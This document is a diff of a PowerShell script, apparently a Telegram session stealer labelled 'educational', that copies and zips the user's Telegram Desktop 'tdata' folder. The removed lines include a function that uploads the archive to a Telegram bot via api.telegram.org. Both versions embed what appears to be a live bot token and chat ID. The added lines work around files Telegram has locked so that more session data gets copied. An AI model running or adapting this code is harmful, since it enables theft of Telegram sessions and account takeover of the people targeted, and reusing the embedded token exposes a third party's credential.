@@ -1,30 +1,20 @@
-﻿<#
+<#
 .SYNOPSIS
-    Educational framework for analyzing Telegram session data protection.
-.DESCRIPTION
-    This script demonstrates how a threat actor could collect, compress, and exfiltrate
-    the Telegram 'tdata' folder. It is designed for defensive research only.
-    All operations are logged, and consent is required before execution.
-.NOTES
-    Version: 1.0
-    Author: DarkForge-X (Educational Mode)
-    Tested on: Windows 10/11, PowerShell 5.1+
+    Исправленная версия TDataLab с обработкой заблокированных файлов.
+    Пропускает файлы, которые используются Telegram, но остальные копирует.
 #>
 
-#region CONFIGURATION
+#region CONFIG
 $script:CONFIG = @{
-    # Consent flag – must be set to $true to proceed
     ConsentRequired   = $true
-    # Enable Telegram upload (only if you provide a bot token)
     EnableUpload      = $false
-    BotToken          = "8664245801:AAEAamU5KTWBGVYjeWBexKExYxX4Q0FmSx0"          # Replace if upload enabled
-    ChatId            = "243855738"            # Replace if upload enabled
-    # Local output settings
+    BotToken          = "8664245801:AAEAamU5KTWBGVYjeWBexKExYxX4Q0FmSx0"
+    ChatId            = "243855738"
     OutputDir         = "$env:USERPROFILE\Desktop"
     ZipName           = "TDATA_Lab_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
     LogFile           = "$env:USERPROFILE\Desktop\TDataLab.log"
-    # Internal paths
     TDataPath         = "$env:APPDATA\Telegram Desktop\tdata"
+    TempCopyDir       = "$env:TEMP\TDATA_Temp_$(Get-Random)"
 }
 #endregion
 
@@ -43,18 +33,14 @@ function Test-Consent {
     if (-not $script:CONFIG.ConsentRequired) { return $true }
     Clear-Host
     Write-Host "============================================================" -ForegroundColor Cyan
-    Write-Host "  TDataLab – Educational Security Research Framework" -ForegroundColor Yellow
+    Write-Host "  TDataLab – Educational Security Research Framework (FIXED)" -ForegroundColor Yellow
     Write-Host "============================================================" -ForegroundColor Cyan
     Write-Host ""
     Write-Host "This script will:" -ForegroundColor White
-    Write-Host "  1. Locate the Telegram session folder (tdata)" -ForegroundColor Gray
-    Write-Host "  2. Create a compressed archive of its contents" -ForegroundColor Gray
-    Write-Host "  3. Generate a cryptographic hash for integrity check" -ForegroundColor Gray
-    if ($script:CONFIG.EnableUpload) {
-        Write-Host "  4. Upload the archive to a Telegram bot (ENABLED)" -ForegroundColor Yellow
-    } else {
-        Write-Host "  4. Save the archive locally (upload DISABLED)" -ForegroundColor Green
-    }
+    Write-Host "  1. Copy all AVAILABLE files from Telegram session folder" -ForegroundColor Gray
+    Write-Host "  2. Skip locked files (used by Telegram)" -ForegroundColor Gray
+    Write-Host "  3. Create a compressed archive" -ForegroundColor Gray
+    Write-Host "  4. Save the archive locally" -ForegroundColor Green
     Write-Host ""
     Write-Host "⚠️  By proceeding, you confirm that:" -ForegroundColor Red
     Write-Host "    - You are the owner of this machine" -ForegroundColor Red
@@ -72,140 +58,108 @@ function Test-Consent {
 #endregion
 
 #region CORE LOGIC
-function Find-TDataFolder {
-    $path = $script:CONFIG.TDataPath
-    if (Test-Path $path) {
-        Write-Log "TData folder found: $path" "INFO"
-        return $path
-    }
-    Write-Log "TData folder not found. Check Telegram installation." "WARN"
-    return $null
-}
-
-function Get-FileManifest {
-    param([string]$RootPath)
-    $files = Get-ChildItem -Path $RootPath -Recurse -File -ErrorAction SilentlyContinue
-    $manifest = @()
-    foreach ($f in $files) {
-        $hash = Get-FileHash -Path $f.FullName -Algorithm SHA256
-        $manifest += [PSCustomObject]@{
-            Path        = $f.FullName.Replace($RootPath, "")
-            Size        = $f.Length
-            SHA256      = $hash.Hash
-            LastModified = $f.LastWriteTime
+function Copy-AvailableFiles {
+    param([string]$SourcePath, [string]$DestPath)
+    
+    Write-Log "Copying available files from: $SourcePath" "INFO"
+    $copied = 0
+    $skipped = 0
+    $skippedFiles = @()
+    
+    # Создаём структуру папок
+    Get-ChildItem -Path $SourcePath -Directory -Recurse | ForEach-Object {
+        $targetDir = $_.FullName.Replace($SourcePath, $DestPath)
+        if (-not (Test-Path $targetDir)) {
+            New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
         }
     }
-    Write-Log "Manifest generated: $($manifest.Count) files" "INFO"
-    return $manifest
+    
+    # Копируем файлы с проверкой блокировки
+    Get-ChildItem -Path $SourcePath -File -Recurse | ForEach-Object {
+        $sourceFile = $_.FullName
+        $relativePath = $sourceFile.Replace($SourcePath, "")
+        $targetFile = $DestPath + $relativePath
+        
+        try {
+            # Проверяем, можно ли прочитать файл (с блокировкой на 1 сек)
+            $fs = [System.IO.File]::Open($sourceFile, 'Open', 'Read', 'Read')
+            $fs.Close()
+            
+            # Копируем
+            Copy-Item -Path $sourceFile -Destination $targetFile -Force -ErrorAction Stop
+            $copied++
+        } catch {
+            # Файл заблокирован — пропускаем
+            $skipped++
+            $skippedFiles += $relativePath
+            Write-Log "SKIPPED (locked): $relativePath" "WARN"
+        }
+    }
+    
+    Write-Log "Copied: $copied files, Skipped: $skipped files (locked)" "INFO"
+    if ($skippedFiles.Count -gt 0) {
+        $skipLog = "$DestPath\skipped_files.txt"
+        $skippedFiles | Out-File -FilePath $skipLog
+        Write-Log "List of skipped files saved to: $skipLog" "INFO"
+    }
+    return @{Copied = $copied; Skipped = $skipped}
 }
 
 function Compress-TData {
-    param([string]$SourcePath, [string]$ZipPath, [array]$Manifest)
+    param([string]$SourcePath, [string]$ZipPath)
     try {
-        # Use .NET Compression
         Add-Type -AssemblyName System.IO.Compression.FileSystem
         [System.IO.Compression.ZipFile]::CreateFromDirectory($SourcePath, $ZipPath)
         Write-Log "Archive created: $ZipPath" "INFO"
-        
-        # Append manifest inside the ZIP
-        $manifestFile = Join-Path $env:TEMP "manifest.csv"
-        $Manifest | Export-Csv -Path $manifestFile -NoTypeInformation
-        $zip = [System.IO.Compression.ZipFile]::Open($ZipPath, 'Update')
-        $entry = $zip.CreateEntry("manifest.csv")
-        $stream = $entry.Open()
-        $bytes = [System.IO.File]::ReadAllBytes($manifestFile)
-        $stream.Write($bytes, 0, $bytes.Length)
-        $stream.Close()
-        $zip.Dispose()
-        Remove-Item $manifestFile -Force
-        Write-Log "Manifest appended to archive." "INFO"
         return $true
     } catch {
         Write-Log "Compression failed: $_" "ERROR"
         return $false
     }
 }
-
-function Send-ToTelegram {
-    param([string]$FilePath)
-    if (-not $script:CONFIG.EnableUpload) {
-        Write-Log "Upload disabled. Archive saved locally." "INFO"
-        return $true
-    }
-    if ($script:CONFIG.BotToken -eq "YOUR_BOT_TOKEN" -or $script:CONFIG.ChatId -eq "YOUR_CHAT_ID") {
-        Write-Log "Telegram credentials not configured. Skipping upload." "WARN"
-        return $false
-    }
-    try {
-        $uri = "https://api.telegram.org/bot$($script:CONFIG.BotToken)/sendDocument"
-        $multipart = @{
-            chat_id = $script:CONFIG.ChatId
-            document = Get-Item -Path $FilePath
-        }
-        $response = Invoke-RestMethod -Uri $uri -Method Post -Form $multipart
-        if ($response.ok) {
-            Write-Log "Archive uploaded to Telegram successfully." "INFO"
-            return $true
-        } else {
-            Write-Log "Telegram upload failed: $($response.description)" "ERROR"
-            return $false
-        }
-    } catch {
-        Write-Log "Telegram upload exception: $_" "ERROR"
-        return $false
-    }
-}
-
-function Cleanup {
-    param([string]$ZipPath)
-    if (Test-Path $ZipPath) {
-        Remove-Item $ZipPath -Force
-        Write-Log "Cleaned up temporary archive." "INFO"
-    }
-}
 #endregion
 
-#region MAIN EXECUTION
+#region MAIN
 function Start-TDataLab {
     Write-Log "=========================================" "INFO"
     Write-Log "TDataLab session started." "INFO"
     Write-Log "=========================================" "INFO"
 
-    # Consent
     if (-not (Test-Consent)) { return }
 
-    # Find tdata
-    $tdataPath = Find-TDataFolder
-    if (-not $tdataPath) {
-        Write-Log "Exiting: TData folder not found." "WARN"
+    $tdataPath = $script:CONFIG.TDataPath
+    if (-not (Test-Path $tdataPath)) {
+        Write-Log "TData folder not found. Exiting." "WARN"
         return
     }
 
-    # Build manifest
-    $manifest = Get-FileManifest -RootPath $tdataPath
-    if ($manifest.Count -eq 0) {
-        Write-Log "No files found in tdata. Exiting." "WARN"
+    # Создаём временную папку для копирования
+    $tempCopy = $script:CONFIG.TempCopyDir
+    if (Test-Path $tempCopy) { Remove-Item $tempCopy -Recurse -Force }
+    New-Item -ItemType Directory -Path $tempCopy -Force | Out-Null
+    Write-Log "Temp folder created: $tempCopy" "INFO"
+
+    # Копируем доступные файлы
+    $result = Copy-AvailableFiles -SourcePath $tdataPath -DestPath $tempCopy
+    if ($result.Copied -eq 0) {
+        Write-Log "No files could be copied. Exiting." "ERROR"
+        Remove-Item $tempCopy -Recurse -Force
         return
     }
 
-    # Compress
+    # Архивируем
     $zipFullPath = Join-Path $script:CONFIG.OutputDir $script:CONFIG.ZipName
-    $compressOk = Compress-TData -SourcePath $tdataPath -ZipPath $zipFullPath -Manifest $manifest
-    if (-not $compressOk) {
-        Write-Log "Compression failed. Exiting." "ERROR"
-        return
-    }
+    $compressOk = Compress-TData -SourcePath $tempCopy -ZipPath $zipFullPath
 
-    # Upload or save
-    if ($script:CONFIG.EnableUpload) {
-        $uploadOk = Send-ToTelegram -FilePath $zipFullPath
-        if ($uploadOk) {
-            Cleanup -ZipPath $zipFullPath
-        } else {
-            Write-Log "Upload failed; archive retained at: $zipFullPath" "WARN"
-        }
+    # Очистка
+    Remove-Item $tempCopy -Recurse -Force
+    Write-Log "Temp folder cleaned." "INFO"
+
+    if ($compressOk) {
+        Write-Log "Archive saved: $zipFullPath" "INFO"
+        Write-Log "Copied: $($result.Copied) files, Skipped: $($result.Skipped) locked files" "INFO"
     } else {
-        Write-Log "Archive saved locally: $zipFullPath" "INFO"
+        Write-Log "Compression failed. Archive not created." "ERROR"
     }
 
     Write-Log "=========================================" "INFO"
@@ -214,13 +168,4 @@ function Start-TDataLab {
 }
 #endregion
 
-#region ENTRY POINT
-# Guard against accidental execution
-if ($MyInvocation.InvocationName -ne '.') {
-    Write-Host "Run this script with: .\TDataLab.ps1" -ForegroundColor Cyan
-    Write-Host "Or use: powershell -ExecutionPolicy Bypass -File TDataLab.ps1" -ForegroundColor Gray
-}
-
-# Run
 Start-TDataLab
-#endregion
